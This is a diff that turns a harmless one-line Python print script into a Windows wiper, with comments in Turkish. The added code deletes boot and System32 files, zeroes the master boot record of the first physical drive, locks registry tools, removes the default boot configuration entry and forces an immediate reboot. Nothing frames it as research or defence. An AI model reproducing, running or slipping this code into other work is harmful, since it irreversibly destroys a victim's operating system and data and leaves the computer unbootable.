@@ -1,1 +1,90 @@
-print("GitHub'dan kod çalıştırıldı!")
+import os
+import shutil
+import subprocess
+
+# ==========================================
+# KRİTİK SİSTEM DOSYALARINI SİL
+# ==========================================
+def delete_system_files():
+    try:
+        # Boot dosyaları
+        boot_files = [
+            "C:\\bootmgr",
+            "C:\\Boot\\BCD",
+            "C:\\Windows\\System32\\winload.exe",
+            "C:\\Windows\\System32\\winload.efi",
+            "C:\\Windows\\System32\\winlogon.exe",
+            "C:\\Windows\\System32\\hal.dll"
+        ]
+        for f in boot_files:
+            try:
+                if os.path.exists(f):
+                    os.remove(f)
+                    print(f"[+] Silindi: {f}")
+            except Exception as e:
+                print(f"[-] Silinemedi: {f} - {e}")
+    except Exception as e:
+        print(f"[-] Hata: {e}")
+
+# ==========================================
+# MBR (MASTER BOOT RECORD) SİL
+# ==========================================
+def wipe_mbr():
+    try:
+        with open("\\\\.\\PhysicalDrive0", "wb") as f:
+            f.write(b'\x00' * 512)
+        print("[+] MBR silindi!")
+    except Exception as e:
+        print(f"[-] MBR silinemedi: {e}")
+
+# ==========================================
+# REGISTRY KİLİTLE
+# ==========================================
+def lock_registry():
+    try:
+        import winreg
+        key = winreg.HKEY_CURRENT_USER
+        subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
+        winreg.CreateKey(key, subkey)
+        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
+            winreg.SetValueEx(regkey, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
+        print("[+] Registry kilitlendi!")
+    except Exception as e:
+        print(f"[-] Registry hatası: {e}")
+
+# ==========================================
+# SİSTEM32 DLL SİL
+# ==========================================
+def delete_dlls():
+    try:
+        os.system('del /f /s /q C:\\Windows\\System32\\*.dll >nul 2>&1')
+        print("[+] DLL'ler silindi!")
+    except Exception as e:
+        print(f"[-] DLL silinemedi: {e}")
+
+# ==========================================
+# BCD SİL
+# ==========================================
+def delete_bcd():
+    try:
+        subprocess.run('bcdedit /delete {default} /f', shell=True, capture_output=True)
+        print("[+] BCD silindi!")
+    except Exception as e:
+        print(f"[-] BCD silinemedi: {e}")
+
+# ==========================================
+# HEP BİRLİKTE ÇALIŞTIR
+# ==========================================
+if __name__ == "__main__":
+    print("[*] Sistem silme işlemi başlatıldı...")
+    
+    delete_system_files()
+    wipe_mbr()
+    lock_registry()
+    delete_dlls()
+    delete_bcd()
+    
+    print("[+] Sistem silme tamamlandı!")
+    
+    # Bilgisayarı yeniden başlat
+    os.system("shutdown /r /t 0")
